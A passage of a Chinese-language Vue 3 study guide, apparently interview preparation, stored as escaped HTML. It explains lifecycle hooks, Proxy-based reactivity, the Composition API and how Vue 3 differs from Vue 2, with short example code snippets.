API</code>生命周期</strong></p>\\n<ul>\\n<li><code>beforeDestroy</code>改为<code>beforeUnmount</code></li>\\n<li><code>destroyed</code>改为<code>umounted</code></li>\\n<li>其他沿用<code>vue2</code>生命周期</li>\\n</ul>\\n<p><strong><code>Composition API</code>生命周期</strong></p>\\n<pre class=\\"language-js\\"><code>import { onBeforeMount, onMounted, onBeforeUpdate, onUpdated, onBeforeUnmount, onUnmounted } from &#39;vue&#39;\\n\\nexport default {\\n    name: &#39;LifeCycles&#39;,\\n    props: {\\n      msg: String\\n    },\\n    // setup等于 beforeCreate 和 created\\n    setup() {\\n        console.log(&#39;setup&#39;)\\n\\n        onBeforeMount(() =&gt; {\\n            console.log(&#39;onBeforeMount&#39;)\\n        })\\n        onMounted(() =&gt; {\\n            console.log(&#39;onMounted&#39;)\\n        })\\n        onBeforeUpdate(() =&gt; {\\n            console.log(&#39;onBeforeUpdate&#39;)\\n        })\\n        onUpdated(() =&gt; {\\n            console.log(&#39;onUpdated&#39;)\\n        })\\n        onBeforeUnmount(() =&gt; {\\n            console.log(&#39;onBeforeUnmount&#39;)\\n        })\\n        onUnmounted(() =&gt; {\\n            console.log(&#39;onUnmounted&#39;)\\n        })\\n    },\\n\\n    // 兼容vue2生命周期 options API和composition API生命周期二选一\\n    beforeCreate() {\\n        console.log(&#39;beforeCreate&#39;)\\n    },\\n    created() {\\n        console.log(&#39;created&#39;)\\n    },\\n    beforeMount() {\\n        console.log(&#39;beforeMount&#39;)\\n    },\\n    mounted() {\\n        console.log(&#39;mounted&#39;)\\n    },\\n    beforeUpdate() {\\n        console.log(&#39;beforeUpdate&#39;)\\n    },\\n    updated() {\\n        console.log(&#39;updated&#39;)\\n    },\\n    // beforeDestroy 改名\\n    beforeUnmount() {\\n        console.log(&#39;beforeUnmount&#39;)\\n    },\\n    // destroyed 改名\\n    unmounted() {\\n        console.log(&#39;unmounted&#39;)\\n    }\\n}\\n</code></pre>\\n<h3 id=\\"vue3如何实现响应式\\"><a class=\\"header-anchor\\" href=\\"#vue3如何实现响应式\\">#</a> Vue3如何实现响应式</h3>\\n<ul>\\n<li>回顾<code>vue2</code>的<code>Object.defineProperty</code></li>\\n<li>缺点\\n<ul>\\n<li>深度监听对象需要一次性递归</li>\\n<li>无法监听新增属性、删除属性(<code>Vue.set</code>、<code>Vue.delete</code>)</li>\\n<li>无法监听原生数组，需要特殊处理</li>\\n</ul>\\n</li>\\n<li>学习<code>proxy</code>语法</li>\\n<li><code>Vue3</code>中如何使用<code>proxy</code>实现响应式</li>\\n</ul>\\n<p><strong>Proxy 基本使用</strong></p>\\n<pre class=\\"language-js\\"><code>// const data = {\\n//     name: &#39;zhangsan&#39;,\\n//     age: 20,\\n// }\\nconst data = [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;]\\n\\nconst proxyData = new Proxy(data, {\\n    get(target, key, receiver) {\\n        // 只处理本身（非原型的）属性\\n        const ownKeys = Reflect.ownKeys(target)\\n        if (ownKeys.includes(key)) {\\n            console.log(&#39;get&#39;, key) // 监听\\n        }\\n\\n        const result = Reflect.get(target, key, receiver)\\n        return result // 返回结果\\n    },\\n    set(target, key, val, receiver) {\\n        // 重复的数据，不处理\\n        if (val === target[key]) {\\n            return true\\n        }\\n\\n        const result = Reflect.set(target, key, val, receiver)\\n        console.log(&#39;set&#39;, key, val)\\n        // console.log(&#39;result&#39;, result) // true\\n        return result // 是否设置成功\\n    },\\n    deleteProperty(target, key) {\\n        const result = Reflect.deleteProperty(target, key)\\n        console.log(&#39;delete property&#39;, key)\\n        // console.log(&#39;result&#39;, result) // true\\n        return result // 是否删除成功\\n    }\\n})\\n</code></pre>\\n<p><strong>vue3用Proxy 实现响应式</strong></p>\\n<ul>\\n<li>深度监听，性能更好（获取到哪一层才触发响应式<code>get</code>，不是一次性递归）</li>\\n<li>可监听<code>新增/删除</code>属性</li>\\n<li>可监听数组变化</li>\\n</ul>\\n<pre class=\\"language-js\\"><code>// 创建响应式\\nfunction reactive(target = {}) {\\n  if (typeof target !== &#39;object&#39; || target == null) {\\n      // 不是对象或数组，则返回\\n      return target\\n  }\\n\\n  // 代理配置\\n  const proxyConf = {\\n      get(target, key, receiver) {\\n          // 只处理本身（非原型的）属性\\n          const ownKeys = Reflect.ownKeys(target)\\n          if (ownKeys.includes(key)) {\\n              console.log(&#39;get&#39;, key) // 监听\\n          }\\n  \\n          const result = Reflect.get(target, key, receiver)\\n      \\n          // 深度监听\\n          // 性能如何提升的？获取到哪一层才触发响应式get，不是一次性递归\\n          return reactive(result)\\n      },\\n      set(target, key, val, receiver) {\\n          // 重复的数据，不处理\\n          if (val === target[key]) {\\n              return true\\n          }\\n  \\n          const ownKeys = Reflect.ownKeys(target)\\n          if (ownKeys.includes(key)) {\\n              console.log(&#39;已有的 key&#39;, key)\\n          } else {\\n              console.log(&#39;新增的 key&#39;, key)\\n          }\\n\\n          const result = Reflect.set(target, key, val, receiver)\\n          console.log(&#39;set&#39;, key, val)\\n          // console.log(&#39;result&#39;, result) // true\\n          return result // 是否设置成功\\n      },\\n      deleteProperty(target, key) {\\n          const result = Reflect.deleteProperty(target, key)\\n          console.log(&#39;delete property&#39;, key)\\n          // console.log(&#39;result&#39;, result) // true\\n          return result // 是否删除成功\\n      }\\n  }\\n\\n  // 生成代理对象\\n  const observed = new Proxy(target, proxyConf)\\n  return observed\\n}\\n\\n// 测试数据\\nconst data = {\\n  name: &#39;zhangsan&#39;,\\n  age: 20,\\n  info: {\\n      city: &#39;shenshen&#39;,\\n      a: {\\n          b: {\\n              c: {\\n                  d: {\\n                      e: 100\\n                  }\\n              }\\n          }\\n      }\\n  }\\n}\\n\\nconst proxyData = reactive(data)\\n</code></pre>\\n<h3 id=\\"如何理解composition-api和options-api\\"><a class=\\"header-anchor\\" href=\\"#如何理解composition-api和options-api\\">#</a> 如何理解Composition API和Options API</h3>\\n<ul>\\n<li><code>Composition API</code>带来了什么\\n<ul>\\n<li>更好的代码组织</li>\\n<li>更好的逻辑复用</li>\\n<li>更好的类型推导</li>\\n</ul>\\n</li>\\n<li><code>Composition API</code>和<code>Options API</code>如何选择\\n<ul>\\n<li>不建议共用，会引起混乱</li>\\n<li>小型项目、业务逻辑简单，用<code>Option API</code>成本更小一些</li>\\n<li>中大型项目、逻辑复杂，用<code>Composition API</code></li>\\n</ul>\\n</li>\\n</ul>\\n<h3 id=\\"composition-api-如何实现逻辑复用\\"><a class=\\"header-anchor\\" href=\\"#composition-api-如何实现逻辑复用\\">#</a> Composition API 如何实现逻辑复用</h3>\\n<ul>\\n<li>抽离逻辑代码到一个函数</li>\\n<li>函数命名约定为<code>useXx</code>格式（<code>React Hooks</code>也是）</li>\\n<li>在<code>setup</code>中引用<code>useXx</code>函数</li>\\n</ul>\\n<pre class=\\"language-vue\\"><code>&lt;template&gt;\\n    &lt;p&gt;mouse position {{x}} {{y}}&lt;/p&gt;\\n&lt;/template&gt;\\n\\n&lt;script&gt;\\nimport { reactive } from &#39;vue&#39;\\nimport useMousePosition from &#39;./useMousePosition&#39;\\n// import useMousePosition2 from &#39;./useMousePosition&#39;\\n\\nexport default {\\n    name: &#39;MousePosition&#39;,\\n    setup() {\\n        const { x, y } = useMousePosition()\\n        return {\\n            x,\\n            y\\n        }\\n\\n        // const state = useMousePosition2()\\n        // return {\\n        //     state\\n        // }\\n    }\\n}\\n&lt;/script&gt;\\n</code></pre>\\n<pre class=\\"language-js\\"><code>import { reactive, ref, onMounted, onUnmounted } from &#39;vue&#39;\\n\\nfunction useMousePosition() {\\n    const x = ref(0)\\n    const y = ref(0)\\n\\n    function update(e) {\\n        x.value = e.pageX\\n        y.value = e.pageY\\n    }\\n\\n    onMounted(() =&gt; {\\n        console.log(&#39;useMousePosition mounted&#39;)\\n        window.addEventListener(&#39;mousemove&#39;, update)\\n    })\\n\\n    onUnmounted(() =&gt; {\\n        console.log(&#39;useMousePosition unMounted&#39;)\\n        window.removeEventListener(&#39;mousemove&#39;, update)\\n    })\\n\\n    // 合成函数尽量返回ref或toRefs(state)  state = reactive({})\\n    // 这样在使用的时候可以解构但不丢失响应式\\n    return {\\n        x,\\n        y\\n    }\\n}\\n\\n// function useMousePosition2() {\\n//     const state = reactive({\\n//         x: 0,\\n//         y: 0\\n//     })\\n\\n//     function update(e) {\\n//         state.x = e.pageX\\n//         state.y = e.pageY\\n//     }\\n\\n//     onMounted(() =&gt; {\\n//         console.log(&#39;useMousePosition mounted&#39;)\\n//         window.addEventListener(&#39;mousemove&#39;, update)\\n//     })\\n\\n//     onUnmounted(() =&gt; {\\n//         console.log(&#39;useMousePosition unMounted&#39;)\\n//         window.removeEventListener(&#39;mousemove&#39;, update)\\n//     })\\n\\n//     return state\\n// }\\n\\nexport default useMousePosition\\n// export default useMousePosition2\\n</code></pre>\\n<h3 id=\\"composition-api-和-react-hooks-的对比\\"><a class=\\"header-anchor\\" href=\\"#composition-api-和-react-hooks-的对比\\">#</a> Composition API 和 React Hooks 的对比</h3>\\n<ul>\\n<li><code>Composition API</code>的<code>setup</code>(相当于<code>created</code>、<code>beforeCreate</code>的合集)只会调用一次，而<code>React Hooks</code>函数在渲染过程中会被多次调用</li>\\n<li><code>Composition API</code>无需使用<code>useMemo</code>、<code>useCallback</code>避免子组件重复渲染，因为<code>setup</code>只会调用一次，在<code>setup</code>闭包中缓存了变量</li>\\n<li><code>Composition API</code>无需顾虑调用顺序，而<code>React Hooks</code>需要保证<code>hooks</code>的顺序一致（比如<code>不能放在循环、判断</code>里面）</li>\\n<li><code>Composition API</code>的<code>ref</code>、<code>reactive</code>比<code>useState</code>难理解</li>\\n</ul>\\n<h3 id=\\"vue3的设计目标是什么-做了哪些优化\\"><a class=\\"header-anchor\\" href=\\"#vue3的设计目标是什么-做了哪些优化\\">#</a> Vue3的设计目标是什么？做了哪些优化</h3>\\n<p><strong>1、设计目标</strong></p>\\n<p>不以解决实际业务痛点的更新都是耍流氓，下面我们来列举一下<code>Vue3</code>之前我们或许会面临的问题</p>\\n<ul>\\n<li>随着功能的增长，复杂组件的代码变得越来越难以维护</li>\\n<li>缺少一种比较「干净」的在多个组件之间提取和复用逻辑的机制</li>\\n<li>类型推断不够友好</li>\\n<li><code>bundle</code>的时间太久了</li>\\n</ul>\\n<p>而 <code>Vue3</code> 经过长达两三年时间的筹备，做了哪些事情？</p>\\n<p>我们从结果反推</p>\\n<ul>\\n<li>更小</li>\\n<li>更快</li>\\n<li>TypeScript支持</li>\\n<li>API设计一致性</li>\\n<li>提高自身可维护性</li>\\n<li>开放更多底层功能</li>\\n</ul>\\n<p>一句话概述，就是更小更快更友好了</p>\\n<p><strong>更小</strong></p>\\n<ul>\\n<li>\\n<p><code>Vue3</code>移除一些不常用的 <code>API</code></p>\\n</li>\\n<li>\\n<p>引入<code>tree-shaking</code>，可以将无用模块“剪辑”，仅打包需要的，使打包的整体体积变小了</p>\\n</li>\\n</ul>\\n<p><strong>更快</strong></p>\\n<p>主要体现在编译方面：</p>\\n<ul>\\n<li><code>diff</code>算法优化</li>\\n<li>静态提升</li>\\n<li>事件监听缓存</li>\\n<li><code>SSR</code>优化</li>\\n</ul>\\n<p><strong>更友好</strong></p>\\n<p><code>vue3</code>在兼顾<code>vue2</code>的<code>options API</code>的同时还推出了<code>composition API</code>，大大增加了代码的逻辑组织和代码复用能力</p>\\n<p>这里代码简单演示下：</p>\\n<p>存在一个获取鼠标位置的函数</p>\\n<pre class=\\"language-js\\"><code>import { toRefs, reactive } from &#39;vue&#39;;\\nfunction useMouse(){\\n    const state = reactive({x:0,y:0});\\n    const update = e=&gt;{\\n        state.x = e.pageX;\\n        state.y = e.pageY;\\n    }\\n    onMounted(()=&gt;{\\n        window.addEventListener(&#39;mousemove&#39;,update);\\n    })\\n    onUnmounted(()=&gt;{\\n        window.removeEventListener(&#39;mousemove&#39;,update);\\n    })\\n\\n    return toRefs(state);\\n}\\n</code></pre>\\n<p>我们只需要调用这个函数，即可获取<code>x</code>、<code>y</code>的坐标，完全不用关注实现过程</p>\\n<p>试想一下，如果很多类似的第三方库，我们只需要调用即可，不必关注实现过程，开发效率大大提高</p>\\n<p>同时，<code>VUE3</code>是基于<code>typescipt</code>编写的，可以享受到自动的类型定义提示</p>\\n<p><strong>2、优化方案</strong></p>\\n<p><code>vue3</code>从很多层面都做了优化，可以分成三个方面：</p>\\n<ul>\\n<li>源码</li>\\n<li>性能</li>\\n<li>语法 API</li>\\n</ul>\\n<p><strong>源码</strong></p>\\n<p>源码可以从两个层面展开：</p>\\n<ul>\\n<li>源码管理</li>\\n<li>TypeScript</li>\\n</ul>\\n<p><strong>源码管理</strong></p>\\n<p><code>vue3</code>整个源码是通过 <code>monorepo</code>的方式维护的，根据功能将不同的模块拆分到<code>packages</code>目录下面不同的子目录中</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/f223c5d4157351f4.png\\" alt=\\"\\"></p>\\n<p>这样使得模块拆分更细化，职责划分更明确，模块之间的依赖关系也更加明确，开发人员也更容易阅读、理解和更改所有模块源码，提高代码的可维护性</p>\\n<p>另外一些 <code>package</code>（比如 <code>reactivity</code> 响应式库）是可以独立于 <code>Vue</code> 使用的，这样用户如果只想使用 <code>Vue3</code>的响应式能力，可以单独依赖这个响应式库而不用去依赖整个 <code>Vue</code></p>\\n<p><strong>TypeScript</strong></p>\\n<p><code>Vue3</code>是基于<code>typeScript</code>编写的，提供了更好的类型检查，能支持复杂的类型推导</p>\\n<p><strong>性能</strong></p>\\n<p><code>vue3</code>是从什么哪些方面对性能进行进一步优化呢？</p>\\n<ul>\\n<li>体积优化</li>\\n<li>编译优化</li>\\n<li>数据劫持优化</li>\\n</ul>\\n<p>这里讲述数据劫持：</p>\\n<p>在<code>vue2</code>中，数据劫持是通过<code>Object.defineProperty</code>，这个 API 有一些缺陷，并不能检测对象属性的添加和删除</p>\\n<pre class=\\"language-js\\"><code>Object.defineProperty(data, &#39;a&#39;,{\\n  get(){\\n    // track\\n  },\\n  set(){\\n    // trigger\\n  }\\n})\\n</code></pre>\\n<p>尽管<code>Vue</code>为了解决这个问题提供了 <code>set</code>和<code>delete</code>实例方法，但是对于用户来说，还是增加了一定的心智负担</p>\\n<p>同时在面对嵌套层级比较深的情况下，就存在性能问题</p>\\n<pre class=\\"language-js\\"><code>default {\\n  data: {\\n    a: {\\n      b: {\\n          c: {\\n          d: 1\\n        }\\n      }\\n    }\\n  }\\n}\\n</code></pre>\\n<p>相比之下，<code>vue3</code>是通过<code>proxy</code>监听整个对象，那么对于删除还是监听当然也能监听到</p>\\n<p>同时<code>Proxy</code> 并不能监听到内部深层次的对象变化，而 <code>Vue3</code> 的处理方式是在<code>getter</code> 中去递归响应式，这样的好处是真正访问到的内部对象才会变成响应式，而不是无脑递归</p>\\n<p><strong>语法 API</strong></p>\\n<p>这里当然说的就是<code>composition API</code>，其两大显著的优化：</p>\\n<ul>\\n<li>优化逻辑组织</li>\\n<li>优化逻辑复用</li>\\n</ul>\\n<p><strong>逻辑组织</strong></p>\\n<p>一张图，我们可以很直观地感受到 <code>Composition API</code>在逻辑组织方面的优势</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/c17ce45b7fdc302a.png\\" alt=\\"\\"></p>\\n<p>相同功能的代码编写在一块，而不像<code>options API</code>那样，各个功能的代码混成一块</p>\\n<p><strong>逻辑复用</strong></p>\\n<p>在<code>vue2</code>中，我们是通过<code>mixin</code>实现功能混合，如果多个<code>mixin</code>混合，会存在两个非常明显的问题：命名冲突和数据来源不清晰</p>\\n<p>而通过<code>composition</code>这种形式，可以将一些复用的代码抽离出来作为一个函数，只要的使用的地方直接进行调用即可</p>\\n<p>同样是上文的获取鼠标位置的例子</p>\\n<pre class=\\"language-js\\"><code>import { toRefs, reactive, onUnmounted, onMounted } from &#39;vue&#39;;\\nfunction useMouse(){\\n    const state = reactive({x:0,y:0});\\n    const update = e=&gt;{\\n        state.x = e.pageX;\\n        state.y = e.pageY;\\n    }\\n    onMounted(()=&gt;{\\n        window.addEventListener(&#39;mousemove&#39;,update);\\n    })\\n    onUnmounted(()=&gt;{\\n        window.removeEventListener(&#39;mousemove&#39;,update);\\n    })\\n\\n    return toRefs(state);\\n}\\n</code></pre>\\n<p>组件使用</p>\\n<pre class=\\"language-js\\"><code>import useMousePosition from &#39;./mouse&#39;\\nexport default {\\n    setup() {\\n        const { x, y } = useMousePosition()\\n        return { x, y }\\n    }\\n}\\n</code></pre>\\n<p>可以看到，整个数据来源清晰了，即使去编写更多的<code>hook</code>函数，也不会出现命名冲突的问题</p>\\n<h3 id=\\"vue3有了解过吗-能说说跟vue2的区别吗\\"><a class=\\"header-anchor\\" href=\\"#vue3有了解过吗-能说说跟vue2的区别吗\\">#</a> Vue3有了解过吗？能说说跟vue2的区别吗？</h3>\\n<p><strong>1. 哪些变化</strong></p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/049a80c13ad8fba9.png\\" alt=\\"\\"></p>\\n<p>从上图中，我们可以概览<code>Vue3</code>的新特性，如下：</p>\\n<ul>\\n<li>速度更快</li>\\n<li>体积减少</li>\\n<li>更易维护</li>\\n<li>更接近原生</li>\\n<li>更易使用</li>\\n</ul>\\n<p><strong>1.1 速度更快</strong></p>\\n<p><code>vue3</code>相比<code>vue2</code></p>\\n<ul>\\n<li>重写了虚拟<code>Dom</code>实现</li>\\n<li>编译模板的优化</li>\\n<li>更高效的组件初始化</li>\\n<li><code>undate</code>性能提高1.3~2倍</li>\\n<li><code>SSR</code>速度提高了2~3倍</li>\\n</ul>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/5e2b7ed267793461.png\\" alt=\\"\\"></p>\\n<p><strong>1.2 体积更小</strong></p>\\n<p>通过<code>webpack</code>的<code>tree-shaking</code>功能，可以将无用模块“剪辑”，仅打包需要的</p>\\n<p>能够<code>tree-shaking</code>，有两大好处：</p>\\n<ul>\\n<li>对开发人员，能够对<code>vue</code>实现更多其他的功能，而不必担忧整体体积过大</li>\\n<li>对使用者，打包出来的包体积变小了</li>\\n</ul>\\n<p><code>vue</code>可以开发出更多其他的功能，而不必担忧<code>vue</code>打包出来的整体体积过多</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/012cda86feaa9b93.png\\" alt=\\"\\"></p>\\n<p><strong>1.3 更易维护</strong></p>\\n<p><strong>compositon Api</strong></p>\\n<ul>\\n<li>可与现有的<code>Options API</code>一起使用</li>\\n<li>灵活的逻辑组合与复用</li>\\n<li><code>Vue3</code>模块可以和其他框架搭配使用</li>\\n</ul>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/dbd78b33807a1196.png\\" alt=\\"\\"></p>\\n<p><strong>更好的Typescript支持</strong></p>\\n<p><code>VUE3</code>是基于<code>typescipt</code>编写的，可以享受到自动的类型定义提示</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/440059fdfdb0fb0a.png\\" alt=\\"\\"></p>\\n<p><strong>1.4 编译器重写</strong></p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/2ec6c2e81e6d9996.png\\" alt=\\"\\"></p>\\n<p><strong>1.5 更接近原生</strong></p>\\n<p>可以自定义渲染 API</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/88eb4d1859e9a619.png\\" alt=\\"\\"></p>\\n<p><strong>1.6 更易使用</strong></p>\\n<p>响应式 <code>Api</code> 暴露出来</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/5448e66d67acb711.png\\" alt=\\"\\"></p>\\n<p>轻松识别组件重新渲染原因</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/55ba7c3f18ce4330.png\\" alt=\\"\\"></p>\\n<p><strong>2. Vue3新增特性</strong></p>\\n<p>Vue 3 中需要关注的一些新功能包括：</p>\\n<ul>\\n<li><code>framents</code></li>\\n<li><code>Teleport</code></li>\\n<li><code>composition Api</code></li>\\n<li><code>createRenderer</code></li>\\n</ul>\\n<p><strong>2.1 framents</strong></p>\\n<p>在 <code>Vue3.x</code> 中，组件现在支持有多个根节点</p>\\n<pre class=\\"language-js\\"><code>&lt;!-- Layout.vue --&gt;\\n&lt;template&gt;\\n  &lt;header&gt;...&lt;/header&gt;\\n  &lt;main v-bind=&quot;$attrs&quot;&gt;...&lt;/main&gt;\\n  &lt;footer&gt;...&lt;/footer&gt;\\n&lt;/template&gt;\\n</code></pre>\\n<p><strong>2.2 Teleport</strong></p>\\n<p><code>Teleport</code> 是一种能够将我们的模板移动到 <code>DOM</code> 中 <code>Vue app</code> 之外的其他位置的技术，就有点像哆啦A梦的“任意门”</p>\\n<p>在<code>vue2</code>中，像 <code>modals</code>,<code>toast</code> 等这样的元素，如果我们嵌套在 <code>Vue</code> 的某个组件内部，那么处理嵌套组件的定位、<code>z-index</code> 和样式就会变得很困难</p>\\n<p>通过<code>Teleport</code>，我们可以在组件的逻辑位置写模板代码，然后在 <code>Vue</code> 应用范围之外渲染它</p>\\n<pre class=\\"language-html\\"><code>&lt;button @click=&quot;showToast&quot; class=&quot;btn&quot;&gt;打开 toast&lt;/button&gt;\\n&lt;!-- to 属性就是目标位置 --&gt;\\n&lt;teleport to=&quot;#teleport-target&quot;&gt;\\n    &lt;div v-if=&quot;visible&quot; class=&quot;toast-wrap&quot;&gt;\\n        &lt;div class=&quot;toast-msg&quot;&gt;我是一个 Toast 文案&lt;/div&gt;\\n    &lt;/div&gt;\\n&lt;/teleport&gt;\\n</code></pre>\\n<p><strong>2.3 createRenderer</strong></p>\\n<p>通过<code>createRenderer</code>，我们能够构建自定义渲染器，我们能够将 <code>vue</code> 的开发模型扩展到其他平台</p>\\n<p>我们可以将其生成在<code>canvas</code>画布上</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/b079618d8640aed7.png\\" alt=\\"\\"></p>\\n<p>关于<code>createRenderer</code>，我们了解下基本使用，就不展开讲述了</p>\\n<pre class=\\"language-js\\"><code>import { createRenderer } from &#39;@vue/runtime-core&#39;\\n\\nconst { render, createApp } = createRenderer({\\n  patchProp,\\n  insert,\\n  remove,\\n  createElement,\\n  // ...\\n})\\n\\nexport { render, createApp }\\n\\nexport * from &#39;@vue/runtime-core&#39;\\n</code></pre>\\n<p><strong>2.4 composition Api</strong></p>\\n<p>composition Api，也就是组合式<code>api</code>，通过这种形式，我们能够更加容易维护我们的代码，将相同功能的变量进行一个集中式的管理</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/f595ce429612b282.png\\" alt=\\"\\"></p>\\n<p>关于<code>compositon api</code>的使用，这里以下图展开</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/a92a5ac0c6ec602a.png\\" alt=\\"\\"></p>\\n<p>简单使用:</p>\\n<pre class=\\"language-js\\"><code>export default {\\n    setup() {\\n        const count = ref(0)\\n        const double = computed(() =&gt; count.value * 2)\\n        function increment() {\\n            count.value++\\n        }\\n        onMounted(() =&gt; console.log(&#39;component mounted!&#39;))\\n        return {\\n            count,\\n            double,\\n            increment\\n        }\\n    }\\n}\\n</code></pre>\\n<p><strong>3. 非兼容变更</strong></p>\\n<p><strong>3.1 Global API</strong></p>\\n<ul>\\n<li>全局 <code>Vue API</code> 已更改为使用应用程序实例</li>\\n<li>全局和内部 <code>API</code> 已经被重构为可 <code>tree-shakable</code></li>\\n</ul>\\n<p><strong>3.2 模板指令</strong></p>\\n<ul>\\n<li>组件上 <code>v-model</code> 用法已更改</li>\\n<li><code>&lt;template v-for&gt;</code>和 非 <code>v-for</code>节点上<code>key</code>用法已更改</li>\\n<li>在同一元素上使用的 <code>v-if</code> 和 <code>v-for</code> 优先级已更改</li>\\n<li><code>v-bind=&quot;object&quot;</code> 现在排序敏感</li>\\n<li><code>v-for</code> 中的 <code>ref</code> 不再注册 <code>ref</code> 数组</li>\\n</ul>\\n<p><strong>3.3 组件</strong></p>\\n<ul>\\n<li>只能使用普通函数创建功能组件</li>\\n<li><code>functional</code> 属性在单文件组件 <code>(SFC)</code></li>\\n<li>异步组件现在需要 <code>defineAsyncComponent</code> 方法来创建</li>\\n</ul>\\n<p><strong>3.4 渲染函数</strong></p>\\n<ul>\\n<li>渲染函数<code>API</code>改变</li>\\n<li><code>$scopedSlots</code> property 已删除，所有插槽都通过 <code>$slots</code> 作为函数暴露</li>\\n<li>自定义指令 API 已更改为与组件生命周期一致</li>\\n<li>一些转换<code>class</code>被重命名了：\\n<ul>\\n<li><code>v-enter</code> -&gt; <code>v-enter-from</code></li>\\n<li><code>v-leave</code> -&gt; <code>v-leave-from</code></li>\\n</ul>\\n</li>\\n<li>组件 <code>watch</code> 选项和实例方法 <code>$watch</code>不再支持点分隔字符串路径，请改用计算函数作为参数</li>\\n<li>在 <code>Vue 2.x</code> 中，应用根容器的 <code>outerHTML</code> 将替换为根组件模板 (如果根组件没有模板/渲染选项，则最终编译为模板)。<code>VUE3.x</code> 现在使用应用程序容器的 <code>innerHTML</code>。</li>\\n</ul>\\n<p><strong>3.5 其他小改变</strong></p>\\n<ul>\\n<li><code>destroyed</code> 生命周期选项被重命名为 <code>unmounted</code></li>\\n<li><code>beforeDestroy</code> 生命周期选项被重命名为 <code>beforeUnmount</code></li>\\n<li><code>prop default</code>工厂函数不再有权访问 <code>this</code> 是上下文</li>\\n<li>自定义指令 API 已更改为与组件生命周期一致</li>\\n<li><code>data</code> 应始终声明为函数</li>\\n<li>来自 <code>mixin</code> 的 <code>data</code> 选项现在可简单地合并</li>\\n<li><code>attribute</code> 强制策略已更改</li>\\n<li>一些过渡 <code>class</code> 被重命名</li>\\n<li>组建 watch 选项和实例方法 <code>$watch</code>不再支持以点分隔的字符串路径。请改用计算属性函数作为参数。</li>\\n<li><code>&lt;template&gt;</code> 没有特殊指令的标记 (<code>v-if/else-if/else</code>、<code>v-for</code> 或 <code>v-slot</code>) 现在被视为普通元素，并将生成原生的 <code>&lt;template&gt;</code> 元素，而不是渲染其内部内容。</li>\\n<li>在<code>Vue 2.x</code> 中，应用根容器的 <code>outerHTML</code> 将替换为根组件模板 (如果根组件没有模板/渲染选项，则最终编译为模板)。<code>Vue 3.x</code> 现在使用应用容器的 <code>innerHTML</code>，这意味着容器本身不再被视为模板的一部分。</li>\\n</ul>\\n<p><strong>3.6 移除 API</strong></p>\\n<ul>\\n<li><code>keyCode</code> 支持作为 <code>v-on</code> 的修饰符</li>\\n<li><code>$on</code>，<code>$off</code>和<code>$once</code> 实例方法</li>\\n<li>过滤<code>filter</code></li>\\n<li>内联模板 <code>attribute</code></li>\\n<li><code>$destroy</code> 实例方法。用户不应再手动管理单个<code>Vue</code> 组件的生命周期。</li>\\n</ul>\\n<h3 id=\\"你知道哪些vue3新特性\\"><a class=\\"header-anchor\\" href=\\"#你知道哪些vue3新特性\\">#</a> 你知道哪些Vue3新特性?</h3>\\n<p>官网列举的最值得注意的新特性：<a href=\\"https://v3-migration.vuejs.org/#notable-new-features\\">v3-migration.vuejs.org</a></p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/d0d7ed1343411fab.png\\" alt=\\"\\"></p>\\n<ul>\\n<li><code>Composition API</code></li>\\n<li><code>SFC Composition API</code>语法糖</li>\\n<li><code>Teleport</code>传送门</li>\\n<li><code>Fragments</code>片段</li>\\n<li><code>Emits</code>选项</li>\\n<li>自定义渲染器</li>\\n<li><code>SFC CSS</code>变量</li>\\n<li><code>Suspense</code></li>\\n</ul>\\n<p>以上这些是api相关，另外还有很多框架特性也不能落掉</p>\\n<div class=\\"tip\\">\\n<ol>\\n<li><code>api</code>层面<code>Vue3</code>新特性主要包括：<code>Composition API</code>、<code>SFC Composition API</code>语法糖、<code>Teleport</code>传送门、<code>Fragments</code> 片段、<code>Emits</code>选项、自定义渲染器、<code>SFC CSS</code>变量、<code>Suspense</code></li>\\n<li>另外，<code>Vue3.0</code>在框架层面也有很多亮眼的改进：</li>\\n</ol>\\n<ul>\\n<li><strong>更快</strong>\\n<ul>\\n<li>虚拟<code>DOM</code>重写，<code>diff</code>算法优化</li>\\n<li>编译器优化：静态提升、<code>patchFlags（静态标记）</code>、事件监听缓存</li>\\n<li>基于<code>Proxy</code>的响应式系统</li>\\n<li><code>SSR</code>优化</li>\\n</ul>\\n</li>\\n<li><strong>更小</strong>：更好的摇树优化 <code>tree shaking</code>、<code>Vue3</code>移除一些不常用的 <code>API</code></li>\\n<li><strong>更友好</strong>：<code>vue3</code>在兼顾<code>vue2</code>的<code>options API</code>的同时还推出了<code>composition API</code>，大大增加了代码的逻辑组织和代码复用能力</li>\\n<li><strong>更容易维护</strong>：<code>TypeScript</code> + 模块化</li>\\n<li><strong>更容易扩展</strong>\\n<ul>\\n<li>独立的响应化模块</li>\\n<li>自定义渲染器</li>\\n</ul>\\n</li>\\n</ul>\\n</div>\\n<h3 id=\\"vue3速度快的原因\\"><a class=\\"header-anchor\\" href=\\"#vue3速度快的原因\\">#</a> Vue3速度快的原因</h3>\\n<div class=\\"tip\\">\\n<ul>\\n<li>代码层面性能优化主要体现在全新响应式<code>API</code>，基于<code>Proxy</code>实现，性能更好（获取到哪一层才触发响应式<code>get</code>，不是像<code>vue2</code>一次性递归监听数据）</li>\\n<li>编译层面做了更多编译优化处理，比如<code>静态标记 